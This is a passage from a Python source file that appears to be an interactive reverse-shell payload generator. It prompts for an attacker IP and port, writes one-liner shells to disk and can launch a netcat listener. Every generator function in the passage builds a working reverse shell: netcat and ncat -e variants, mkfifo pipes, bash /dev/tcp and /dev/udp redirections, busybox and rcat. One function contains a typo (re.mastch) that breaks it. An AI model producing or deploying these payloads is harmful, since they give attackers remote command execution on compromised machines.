			generate_rust_cat()
	except KeyboardInterrupt:
		print("\nInterrupted, returning to main menu.....")
		time.sleep(1)
	main()


def generate_rust_cat():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"rcat {lhost} {lport} -r sh"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	netcat_menu()


def generate_ncat_udp():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {lhost} {lport} >/tmp/f"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	netcat_menu()


def generate_ncat_exe_e():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"ncat.exe {lhost} {lport} -e sh"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	netcat_menu()



def generate_ncat_e():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"ncat {lhost} {lport} -e sh"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	netcat_menu()


def generate_nc_c():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"nc -c sh {lhost} {lport}"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	netcat_menu()



def generate_busy_box_nc_e():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"busybox nc {lhost} {lport} -e sh"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	netcat_menu()


def generate_nc_exe_e():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"nc.exe {lhost} {lport} -e sh"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	netcat_menu()



def generate_nc_e():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"nc {lhost} {lport} -e sh"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	netcat_menu()


def generate_nc_mkfifo():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	netcat_menu()





def bash_menu():
	try:
		os.system('clear')
		print_header()
		print(Fore.YELLOW + "Generate bash shellcode" + Style.RESET_ALL)
		nl()
		print(Fore.BLUE + "1. Bash -i (Recommended)" + Style.RESET_ALL)
		print(Fore.BLUE + "2. Bash 196" + Style.RESET_ALL)
		print(Fore.BLUE + "3. Bash read line" + Style.RESET_ALL)
		print(Fore.BLUE + "4. Bash 5" + Style.RESET_ALL)
		print(Fore.BLUE + "5. Bash UDP" + Style.RESET_ALL)
		print(Fore.RED + "99. Back" + Style.RESET_ALL)
		nl()
		choice = input("Choose the shell you need! (1-5): ")

		if choice == "1":
			generate_bashi_file()
		elif choice == "2":
			generate_bash196()
		elif choice == "3":
			generate_bash_read_line()
		elif choice == "4":
			generate_bash_5()
		elif choice == "5":
			generate_bash_udp()
	except KeyboardInterrupt:
		print("\nInterrupted, returning to main menu.....")
		time.sleep(1)
	main()

def generate_bash196():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	bash_menu()

def generate_bashi_file():
	try:
		lhost = input("Enter LHOST: ")
		lport = input("Enter LPORT: ")
		filename = input("Enter filename: ")

		command = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal window with the command: nc -nvlp {lport} ")
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu....")
		time.sleep(1)
	bash_menu()

def generate_bash_read_line():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	bash_menu()


def generate_bash_5():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"sh -i 5<> /dev/tcp/{lhost}/{lport} 0<&5 1>&5 2>&5"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	bash_menu()

def generate_bash_udp():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.mastch(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	bash_menu()




	
if __name__ == "__main__":
	main()
